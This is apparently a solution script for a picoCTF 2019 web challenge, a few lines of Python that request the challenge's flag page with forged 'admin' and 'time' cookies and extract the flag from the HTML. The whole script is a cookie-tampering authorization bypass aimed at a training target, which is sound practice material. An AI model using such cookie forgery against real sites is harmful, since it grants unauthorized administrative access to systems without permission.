from requests import *
from bs4 import BeautifulSoup

url = 'https://2019shell1.picoctf.com/problem/37878/flag'
cookies = {
    'admin' : 'True',
    'time' : '1400'
}
s = Session()
r = s.get(url , cookies=cookies)
soup = BeautifulSoup(r.text , 'html.parser')
flag = soup.find('code').get_text()
print(flag)
